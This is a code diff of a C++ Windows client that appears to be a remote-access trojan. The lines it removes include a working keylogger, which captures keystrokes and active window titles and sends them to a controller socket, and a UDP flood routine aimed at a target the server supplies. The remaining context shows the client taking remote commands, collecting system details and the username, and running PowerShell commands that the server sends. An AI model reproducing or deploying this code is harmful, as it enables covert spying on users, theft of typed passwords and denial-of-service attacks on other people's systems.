@@ -45,80 +45,7 @@ void printStringToServer(string character, SOCKET& socket)
 	cout << character;
 }
 
-//Check Possibilities for Lowercase Letters
-string static lowercase(int key)
-{
-	if (key == 0x41) { return "a"; }
-	if (key == 0x42) { return "b"; }
-	if (key == 0x43) { return "c"; }
-	if (key == 0x44) { return "d"; }
-	if (key == 0x45) { return "e"; }
-	if (key == 0x46) { return "f"; }
-	if (key == 0x47) { return "g"; }
-	if (key == 0x48) { return "h"; }
-	if (key == 0x49) { return "i"; }
-	if (key == 0x4A) { return "j"; }
-	if (key == 0x4B) { return "k"; }
-	if (key == 0x4C) { return "l"; }
-	if (key == 0x4D) { return "m"; }
-	if (key == 0x4E) { return "n"; }
-	if (key == 0x4F) { return "o"; }
-	if (key == 0x50) { return "p"; }
-	if (key == 0x51) { return "q"; }
-	if (key == 0x52) { return "r"; }
-	if (key == 0x53) { return "s"; }
-	if (key == 0x54) { return "t"; }
-	if (key == 0x55) { return "u"; }
-	if (key == 0x56) { return "v"; }
-	if (key == 0x57) { return "w"; }
-	if (key == 0x58) { return "x"; }
-	if (key == 0x59) { return "y"; }
-	if (key == 0x5A) { return "z"; }
-}
 
-string static special(int key)
-{
-	if (key == 0x30) { return ")"; }
-	if (key == 0x31) { return "!"; }
-	if (key == 0x32) { return "@"; }
-	if (key == 0x33) { return "#"; }
-	if (key == 0x34) { return "$"; }
-	if (key == 0x35) { return "%"; }
-	if (key == 0x36) { return "^"; }
-	if (key == 0x37) { return "&"; }
-	if (key == 0x38) { return "*"; }
-	if (key == 0x39) { return "("; }
-}
-
-string static otherShift(int key)
-{
-	if (key == 0xBA) { return ":"; }
-	if (key == 0xBB) { return "+"; }
-	if (key == 0xBC) { return "<"; }
-	if (key == 0xBD) { return "_"; }
-	if (key == 0xBE) { return ">"; }
-	if (key == 0xBF) { return "?"; }
-	if (key == 0xC0) { return "~"; }
-	if (key == 0xDB) { return "{"; }
-	if (key == 0xDC) { return "|"; }
-	if (key == 0xDD) { return "}"; }
-	if (key == 0xDE) { return "\""; }
-}
-
-string static other(int key)
-{
-	if (key == 0xBA) { return ";"; }
-	if (key == 0xBB) { return "="; }
-	if (key == 0xBC) { return ","; }
-	if (key == 0xBD) { return "-"; }
-	if (key == 0xBE) { return "."; }
-	if (key == 0xBF) { return "/"; }
-	if (key == 0xC0) { return "`"; }
-	if (key == 0xDB) { return "["; }
-	if (key == 0xDC) { return "/"; }
-	if (key == 0xDD) { return "]"; }
-	if (key == 0xDE) { return "\'"; }
-}
 
 
 bool IsSocketConnected(SOCKET socket)
@@ -225,85 +152,6 @@ string static getUsername()
 	GetUserNameA(username, &length);
 	string name = string(username, length);
 	return name;
-
-}
-
-
-boolean static Keylogg(SOCKET clientSocket)
-{
-
-		for (int i = 0; i < 256; i++)
-		{
-			//char buffer[1024];
-			//int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-			//string receivedString(buffer, bytesReceived);
-
-			//if(receivedString == "Q")
-			//{
-			//	return false;
-			//}
-
-			if (GetAsyncKeyState(i) & 0b1)
-			{
-				//Numbers
-				if (i >= 0x30 && i <= 0x39)
-				{
-					if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
-					{
-						printStringToServer(special(i), clientSocket);
-					}
-					else
-					{
-						printCharToServer((char)i, clientSocket);
-					}
-
-
-				}
-
-				//Capital and Lowercase Alphabet
-				if (i >= 0x41 && i <= 0x5A)
-				{
-					if (GetAsyncKeyState(VK_SHIFT))
-					{
-						printCharToServer((char)i, clientSocket);
-					}
-					else
-					{
-						printStringToServer(lowercase(i), clientSocket);
-					}
-				}
-
-				//Special Keys
-				if (i == VK_SPACE) { printStringToServer(" ", clientSocket); }
-				if (i == VK_RETURN) { printStringToServer("[RETURN]\n", clientSocket); }
-
-				//Detects new window selected if left mouse is pressed
-				if (i == VK_LBUTTON)
-				{
-					printStringToServer("[LEFT CLICK]\n", clientSocket);
-					printStringToServer("New Window Detected: ", clientSocket);
-					printStringToServer(getActiveWindowTitle(), clientSocket);
-					printStringToServer("\n", clientSocket);
-				}
-
-
-				if (i == VK_RBUTTON) { printStringToServer("[RIGHT CLICK]\n", clientSocket); }
-				if (i == VK_BACK) { printStringToServer("[BACKSPACE]", clientSocket); }
-				if (i >= 0xBA && i <= 0xDF)
-				{
-					if (GetAsyncKeyState(VK_SHIFT))
-					{
-						printStringToServer(otherShift(i), clientSocket);
-					}
-					else
-					{
-						printStringToServer(other(i), clientSocket);
-					}
-				}
-			}
-		}
-
-	return true;
 
 }
 
@@ -436,84 +284,6 @@ DWORD WINAPI listen(LPVOID lpParam)
 
 }
 
-void static UDPflood(string info)
-{
-	WSADATA _wsaData;
-
-	WORD wVersion = MAKEWORD(2, 2);
-	WSAStartup(wVersion, &_wsaData);
-
-	SOCKET targetSocket;
-	targetSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	
-	string payload = "";
-
-	for (int i = 0; i < 4500; i++)
-	{
-		payload += "aaaaaaaaaaa";
-		
-	}
-
-	int found = info.find("p");
-	int found2 = info.find("c");
-
-	cout << found << endl;
-	cout << found2 << endl;
-
-	string _ip = info.substr(0, found);
-	string _port = info.substr(found + 1, found2 - found - 1);
-	string _count = info.substr(found2 + 1, info.length());
-
-	cout << "ip: " << _ip << endl;
-	cout << "port: " << _port << endl;
-	cout << "count: " << _count << endl;
-
-	PCSTR ip = _ip.c_str();
-	unsigned short port = stoi(_port);
-	int count = stoi(_count);
-
-
-
-
-	// Fill in the address structure
-	sockaddr_in tar;
-	tar.sin_family = AF_INET;
-
-	//Port Number
-	tar.sin_port = htons(port);
-
-	//IP 
-	//string ipaddress = ip;
-	//inet_pton(AF_INET, ip, &tar.sin_addr);
-	int bytes;
-
-	string ipaddress =ip;
-	tar.sin_addr.s_addr = inet_addr(ipaddress.c_str());
-
-
-	connect(targetSocket, (sockaddr*)&tar, sizeof(tar));
-	cout << WSAGetLastError() << endl;
-
-	string word = "";
-
-
-	for(int i = 0; i < count; i++)
-	{
-		bytes = sendto(targetSocket, payload.c_str(), payload.length(), 0, reinterpret_cast<sockaddr*>(&tar), sizeof(tar));
-		cout << WSAGetLastError();
-		cout << bytes << " bytes sent" << endl;
-
-
-	}
-		
-		
-	
-	
-
-
-}
-
-
 
 
 
@@ -568,42 +338,6 @@ int main()
 					printStringToServer(getSystemInfo(), clientSocket);
 				}
 
-				if (receivedString == "B")
-				{
-					SOCKET keyloggSocket;
-					keyloggSocket = socket(AF_INET, SOCK_STREAM, 0);
-				
-					sockaddr_in info;
-					info.sin_family = AF_INET;
-
-					info.sin_port = htons(8088);
-					string ip = "127.0.0.1";
-					info.sin_addr.s_addr = inet_addr(ip.c_str());
-
-
-					connect(keyloggSocket, (sockaddr*)&info, sizeof(info));
-					cout << WSAGetLastError();
-
-					HANDLE hThread = CreateThread(NULL, 0, listen, NULL, 0, NULL);
-					
-					cout << "Error code: " << GetLastError() << endl;
-
-
-					while(msg != "STOP")
-					{
-						Keylogg(keyloggSocket);
-					}
-
-					msg = "";
-					closesocket(keyloggSocket);
-						
-
-					
-
-
-
-
-					
 				}
 
 				if(receivedString == "C")
@@ -621,19 +355,7 @@ int main()
 					powerShell(command);
 				}
 
-				if(receivedString == "UDP")
-				{
-					cout << "FLOOD" << endl;
-					bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-					string info = deHeartbeatString(string(buffer, bytesReceived));
-					UDPflood(info);
-
-
-					
-					
-
-				}
-
+				
 			
 
 
@@ -660,6 +382,7 @@ int main()
 	
 
 	
+
 
 
 
